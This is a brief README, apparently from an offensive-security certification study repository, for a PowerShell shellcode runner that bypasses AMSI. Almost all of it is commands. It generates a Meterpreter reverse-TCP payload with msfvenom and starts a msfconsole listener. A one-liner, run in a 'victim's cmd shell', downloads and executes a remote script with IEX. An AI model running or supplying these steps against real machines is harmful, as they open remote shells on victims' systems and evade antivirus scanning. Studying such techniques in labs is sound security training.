# Name
Powershell ShellCode Runner with AMSI Bypass

## Usage
```
Change Line 4 in runall.ps1 to Kali's IP

Host Python Webserver on Kali 

Generate payload & put in line 47 of shellcoderunner.ps1

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f powershell

Start Msfconsole listener
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set ExitOnSession false; exploit -j"

In victim's cmd shell
    powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1')

```

## Source
https://github.com/beauknowstech/OSEP-Everything/tree/main/AMSI
